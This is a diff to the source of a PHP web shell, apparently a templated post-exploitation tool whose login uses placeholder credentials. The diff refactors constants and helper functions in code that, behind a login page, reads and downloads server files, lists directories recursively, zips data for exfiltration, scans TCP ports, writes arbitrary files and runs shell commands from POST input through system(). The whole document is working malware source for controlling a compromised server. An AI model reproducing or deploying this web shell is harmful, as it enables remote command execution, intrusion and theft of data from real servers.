@@ -15,18 +15,18 @@
 session_start();
 
 // Features name constants
-define("LOGIN", "__FEAT_LOGIN__");
-define("FILE_EXTRACTION", "__FEAT_FILE_EXTRACTION__");
-define("FILE_EXTRACTION_PREVIEW", "__FEAT_FILE_EXTRACTION_PREVIEW__");
-define("DIRECTORY_LISTING", "__FEAT_DIRECTORY_LISTING__");
-define("EXFILTRATE", "__FEAT_EXFILTRATE__");
-define("PORT_SCAN", "__FEAT_PORT_SCAN__");
-define("WRITE_FILE", "__FEAT_WRITE_FILE__");
-define("RUN_COMMAND", "__FEAT_RUN_COMMAND__");
+$LOGIN = "__FEAT_LOGIN__";
+$FILE_EXTRACTION = "__FEAT_FILE_EXTRACTION__";
+$FILE_EXTRACTION_PREVIEW = "__FEAT_FILE_EXTRACTION_PREVIEW__";
+$DIRECTORY_LISTING = "__FEAT_DIRECTORY_LISTING__";
+$EXFILTRATE = "__FEAT_EXFILTRATE__";
+$PORT_SCAN = "__FEAT_PORT_SCAN__";
+$WRITE_FILE = "__FEAT_WRITE_FILE__";
+$RUN_COMMAND = "__FEAT_RUN_COMMAND__";
 
-define("USERNAME", "__USERNAME__");
-define("PASSWORD", "__PASSWORD__");
-define("SALT", "__SALT__");
+$USERNAME = "__USERNAME__";
+$PASSWORD = "__PASSWORD__";
+$SALT = "__SALT__";
 
 /**
  * Define the enabled features
@@ -34,14 +34,14 @@ define("SALT", "__SALT__");
  * @var array<string, array{title: string, description: string, svg: string, hidden?: bool}> $ENABLED_FEATURES
  */
 $ENABLED_FEATURES = array(
-    FILE_EXTRACTION         => array(
+    $FILE_EXTRACTION         => array(
         "title"       => "File extraction",
         "description" => "Extract file content as base64.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
 </svg>',
     ),
-    FILE_EXTRACTION_PREVIEW => array(
+    $FILE_EXTRACTION_PREVIEW => array(
         "title"       => "File extraction",
         "description" => "Extract file content as base64.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
@@ -49,35 +49,35 @@ $ENABLED_FEATURES = array(
 </svg>',
         "hidden"      => true,
     ),
-    DIRECTORY_LISTING       => array(
+    $DIRECTORY_LISTING       => array(
         "title"       => "Directory listing",
         "description" => "List all files and folders in a directory and optionally its subdirectories.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 12h16.5m-16.5 3.75h16.5M3.75 19.5h16.5M5.625 4.5h12.75a1.875 1.875 0 0 1 0 3.75H5.625a1.875 1.875 0 0 1 0-3.75Z" />
 </svg>',
     ),
-    EXFILTRATE              => array(
+    $EXFILTRATE              => array(
         "title"       => "Exfiltrate",
         "description" => "Exfiltrate data from the server in a password protected zip archive.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M3 16.5v2.25A2.25 2.25 0 0 0 5.25 21h13.5A2.25 2.25 0 0 0 21 18.75V16.5M16.5 12 12 16.5m0 0L7.5 12m4.5 4.5V3" />
 </svg>',
     ),
-    PORT_SCAN               => array(
+    $PORT_SCAN               => array(
         "title"       => "Port scan",
         "description" => "Scan a given range of TCP ports using connect method.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5" />
 </svg>',
     ),
-    WRITE_FILE              => array(
+    $WRITE_FILE              => array(
         "title"       => "Write file",
         "description" => "Write a file to the given path, writing permission are required.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m0 12.75h7.5m-7.5 3H12M10.5 2.25H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
 </svg>',
     ),
-    RUN_COMMAND             => array(
+    $RUN_COMMAND             => array(
         "title"       => "Run command",
         "description" => "Run a system command using the default shell.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
@@ -356,9 +356,9 @@ function makeForm($operation, $action, $elements, $method = "post") {
  * @return string
  */
 function makePage($elements, $current_page) {
-    global $ENABLED_FEATURES, $CSS;
+    global $ENABLED_FEATURES, $CSS, $LOGIN;
     if ($_SESSION["auth"] !== true) {
-        header("Location: ?page=" . LOGIN);
+        header("Location: ?page=" . $LOGIN);
         die();
     }
 
@@ -412,7 +412,7 @@ function makePage($elements, $current_page) {
  * @return string
  */
 function makeLoginPage() {
-    global $CSS;
+    global $CSS, $LOGIN;
     ob_start();
     ?>
     <html lang="en" class="h-full bg-zinc-900">
@@ -431,7 +431,7 @@ function makeLoginPage() {
 
         <div class="mt-10 sm:mx-auto sm:w-full sm:max-w-sm">
             <form class="space-y-6" action="<?php echo $_SERVER["REQUEST_URI"]; ?>" method="post">
-                <input type="hidden" name="__OPERATION__" value="<?php echo LOGIN ?>"/>
+                <input type="hidden" name="__OPERATION__" value="<?php echo $LOGIN ?>"/>
                 <div>
                     <label for="__PARAM_1__" class="block text-sm font-medium leading-6 text-white">
                         Username
@@ -576,6 +576,33 @@ function out($data) {
 ///////////////////////
 
 /**
+ * Download a file in chunks
+ * @param $filepath string Path to the file to download
+ * @param $filesize int Size of the file
+ *
+ * @return void
+ */
+function chunkedDownload($filepath, $filesize) {
+    $chunk_size = 4096; // Adjust chunk size as needed
+
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream'); // Adjust content type if needed
+    header('Content-Disposition: attachment; filename="' . basename($filepath) . '"');
+    header('Content-Transfer-Encoding: chunked');
+    header('Content-Length: ' . $filesize); // Optional: Set content length for progress tracking
+
+    $file_handle = fopen($filepath, 'rb');
+
+    while (!feof($file_handle)) {
+        $chunk = fread($file_handle, $chunk_size);
+        echo $chunk;
+        flush();     // Flush output buffer after sending each chunk
+    }
+
+    fclose($file_handle);
+}
+
+/**
  * Handle the file extraction operation
  *
  * @return void
@@ -592,26 +619,6 @@ function handleFileExtraction() {
 
     $filesize = filesize($filepath);
 
-    $export_callback = function () use ($filepath, $filesize) {
-        $chunk_size = 4096; // Adjust chunk size as needed
-
-        header('Content-Description: File Transfer');
-        header('Content-Type: application/octet-stream'); // Adjust content type if needed
-        header('Content-Disposition: attachment; filename="' . basename($filepath) . '"');
-        header('Content-Transfer-Encoding: chunked');
-        header('Content-Length: ' . $filesize); // Optional: Set content length for progress tracking
-
-        $file_handle = fopen($filepath, 'rb');
-
-        while (!feof($file_handle)) {
-            $chunk = fread($file_handle, $chunk_size);
-            echo $chunk;
-            flush();     // Flush output buffer after sending each chunk
-        }
-
-        fclose($file_handle);
-    };
-
     echo "Reading file '$filepath'\n";
     echo "File size: " . formatBytes($filesize) . "\n";
     if ($preview) {
@@ -624,10 +631,10 @@ function handleFileExtraction() {
     }
 
     if ($filesize < 102400) { // Less than 100Kb
-        $export_callback();
+        chunkedDownload($filepath, $filesize);
     }
     elseif ($export) {
-        $export_callback();
+        chunkedDownload($filepath, $filesize);
     }
 }
 
@@ -659,21 +666,7 @@ function listFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = tr
     }
 
     // Get stat for current path
-    $stat = stat($path);
-
-    // Print information for current path
-    $perm = getPermissionsString($path);
-    echo "$perm " .
-         pad_right("" . $stat["nlink"], 3) .
-         " " .
-         pad_right("" . $stat["uid"], 5) .
-         " " .
-         pad_right("" . $stat["gid"], 5) .
-         " " .
-         formatBytes($stat["size"]) .
-         " " .
-         convertUnixTimestampToDate($stat["mtime"]) .
-         " $path\n";
+    getStatForCurrentPath($path);
 
     if ($show_line_split) {
         echo "----------------\n";
@@ -694,25 +687,39 @@ function listFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = tr
                 }
                 else {
                     // Print information for files beyond max depth
-                    $stat = stat($sub_path);
-                    $perm = getPermissionsString($sub_path);
-                    echo "$perm " .
-                         pad_right("" . $stat["nlink"], 3) .
-                         " " .
-                         pad_right("" . $stat["uid"], 5) .
-                         " " .
-                         pad_right("" . $stat["gid"], 5) .
-                         " " .
-                         formatBytes($stat["size"]) .
-                         " " .
-                         convertUnixTimestampToDate($stat["mtime"]) .
-                         " $sub_path\n";
+                    getStatForCurrentPath($sub_path);
                 }
             }
         }
         // Close directory handle
         closedir($dir_handle);
     }
+}
+
+/**
+ * Get the stat for the current path and print information
+ * @param $path string Path to get stat for
+ *
+ * @return array
+ */
+function getStatForCurrentPath($path) {
+    $stat = stat($path);
+
+    // Print information for current path
+    $perm = getPermissionsString($path);
+    echo "$perm " .
+         pad_right("" . $stat["nlink"], 3) .
+         " " .
+         pad_right("" . $stat["uid"], 5) .
+         " " .
+         pad_right("" . $stat["gid"], 5) .
+         " " .
+         formatBytes($stat["size"]) .
+         " " .
+         convertUnixTimestampToDate($stat["mtime"]) .
+         " $path\n";
+
+    return array($stat, $perm);
 }
 
 /**
@@ -770,11 +777,8 @@ function pad_right($str, $pad_length = 10) {
         return $str; // Return unmodified string for invalid input
     }
 
-    // Calculate the number of spaces needed for padding
-    $padding = max(0, $pad_length - strlen($str));
-
     // Pad the string with spaces using str_pad
-    return str_pad($str, $pad_length, ' ', STR_PAD_RIGHT);
+    return str_pad($str, $pad_length);
 }
 
 /**
@@ -905,23 +909,7 @@ function handleCreateZip() {
     $zip->close();
 
     $file_size  = filesize($zip_name);
-    $chunk_size = 4096; // Adjust chunk size as needed
-
-    header('Content-Description: File Transfer');
-    header('Content-Type: application/octet-stream'); // Adjust content type if needed
-    header('Content-Disposition: attachment; filename="' . basename($zip_name) . '"');
-    header('Content-Transfer-Encoding: chunked');
-    header('Content-Length: ' . $file_size); // Optional: Set content length for progress tracking
-
-    $file_handle = fopen($zip_name, 'rb');
-
-    while (!feof($file_handle)) {
-        $chunk = fread($file_handle, $chunk_size);
-        echo $chunk; // Add CRLF after each chunk
-        flush();     // Flush output buffer after sending each chunk
-    }
-
-    fclose($file_handle);
+    chunkedDownload($zip_name, $file_size);
     unlink($zip_name); // Delete temporary zip file;
 }
 
@@ -1028,12 +1016,13 @@ function handleWriteFile() {
  * @return void
  */
 function handleLogin() {
-    $username = hash("sha512", $_POST["__PARAM_1__"] . SALT);
-    $password = hash("sha512", $_POST["__PARAM_2__"] . SALT);
+    global $SALT, $PASSWORD, $USERNAME, $FILE_EXTRACTION;
+    $username = hash("sha512", $_POST["__PARAM_1__"] . $SALT);
+    $password = hash("sha512", $_POST["__PARAM_2__"] . $SALT);
 
-    if ($username === USERNAME && $password === PASSWORD) {
+    if ($username === $USERNAME && $password === $PASSWORD) {
         $_SESSION["auth"] = true;
-        header("Location: ?page=" . FILE_EXTRACTION, true, 301);
+        header("Location: ?page=" . $FILE_EXTRACTION, true, 301);
     }
 }
 
@@ -1048,23 +1037,23 @@ if (isset($_GET["dev"])) {
 // Define a list of operations that must be run in an isolated environment meaning no other content should be rendered
 // on the page except the operation result.
 $isolated_ops = array(
-    FILE_EXTRACTION,
-    EXFILTRATE,
-    LOGIN,
+    $FILE_EXTRACTION,
+    $EXFILTRATE,
+    $LOGIN,
 );
 
 // Check if the request is not POST and the operation is not in the isolated operations list, then render the page
 if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops))) {
-    $page = isset($_GET['page']) ? $_GET['page'] : ($_SESSION["auth"] === true ? FILE_EXTRACTION : LOGIN);
+    $page = isset($_GET['page']) ? $_GET['page'] : ($_SESSION["auth"] === true ? $FILE_EXTRACTION : $LOGIN);
 
     $content = "";
 
     switch ($page) {
-        case LOGIN:
+        case $LOGIN:
             $content = makeLoginPage();
             break;
-        case FILE_EXTRACTION_PREVIEW:
-        case FILE_EXTRACTION:
+        case $FILE_EXTRACTION_PREVIEW:
+        case $FILE_EXTRACTION:
             $content = makePage(
                 array(
                     makePageHeader(
@@ -1088,14 +1077,14 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "__PARAM_2__",
                                 "Preview",
                                 "Display preview of the file content if it's larger than 100kb.",
-                                $page === FILE_EXTRACTION_PREVIEW,
+                                $page === $FILE_EXTRACTION_PREVIEW,
                                 "y",
-                                $page === FILE_EXTRACTION_PREVIEW
+                                $page === $FILE_EXTRACTION_PREVIEW
                                     ? "window.location.href = '?page=" .
-                                      FILE_EXTRACTION .
+                                      $FILE_EXTRACTION .
                                       "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
                                     : "window.location.href = '?page=" .
-                                      FILE_EXTRACTION_PREVIEW .
+                                      $FILE_EXTRACTION_PREVIEW .
                                       "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
                             ),
                             makeCheckbox(
@@ -1109,7 +1098,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 $page
             );
             break;
-        case DIRECTORY_LISTING:
+        case $DIRECTORY_LISTING:
             $content = makePage(
                 array(
                     makePageHeader(
@@ -1144,7 +1133,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 $page
             );
             break;
-        case EXFILTRATE:
+        case $EXFILTRATE:
             $content = makePage(
                 array(
                     makePageHeader(
@@ -1173,7 +1162,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 $page
             );
             break;
-        case PORT_SCAN:
+        case $PORT_SCAN:
             $content = makePage(
                 array(
                     makePageHeader(
@@ -1214,7 +1203,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 $page
             );
             break;
-        case WRITE_FILE:
+        case $WRITE_FILE:
             $content = makePage(
                 array(
                     makePageHeader(
@@ -1252,7 +1241,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 $page
             );
             break;
-        case RUN_COMMAND:
+        case $RUN_COMMAND:
             $content = makePage(
                 array(
                     makePageHeader(
@@ -1290,7 +1279,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
 
     echo $content;
 
-    if (isPost() && in_array($_POST["__OPERATION__"], $isolated_ops) && $_POST["__OPERATION__"] !== LOGIN) {
+    if (isPost() && in_array($_POST["__OPERATION__"], $isolated_ops) && $_POST["__OPERATION__"] !== $LOGIN) {
         openCommandOutputScreen();
     }
 }
@@ -1299,26 +1288,26 @@ if (isPost()) {
     $operation = $_POST["__OPERATION__"];
 
     switch ($operation) {
-        case LOGIN:
+        case $LOGIN:
             handleLogin();
             break;
-        case FILE_EXTRACTION_PREVIEW:
-        case FILE_EXTRACTION:
+        case $FILE_EXTRACTION_PREVIEW:
+        case $FILE_EXTRACTION:
             handleFileExtraction();
             break;
-        case DIRECTORY_LISTING:
+        case $DIRECTORY_LISTING:
             handleDirectoryListing();
             break;
-        case EXFILTRATE:
+        case $EXFILTRATE:
             handleCreateZip();
             break;
-        case PORT_SCAN:
+        case $PORT_SCAN:
             handlePortScan();
             break;
-        case WRITE_FILE:
+        case $WRITE_FILE:
             handleWriteFile();
             break;
-        case RUN_COMMAND:
+        case $RUN_COMMAND:
             system($_POST["__PARAM_1__"]);
             break;
         default:
@@ -1330,7 +1319,7 @@ if (isPost()) {
 // Check if the request is not POST and the operation is not in the isolated operations list, then render the page end
 if (!isPost() &&
     (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops)) &&
-    $_POST["__OPERATION__"] !== LOGIN) {
+    $_POST["__OPERATION__"] !== $LOGIN) {
     closeCommandOutputScreen();
 }
 ?>
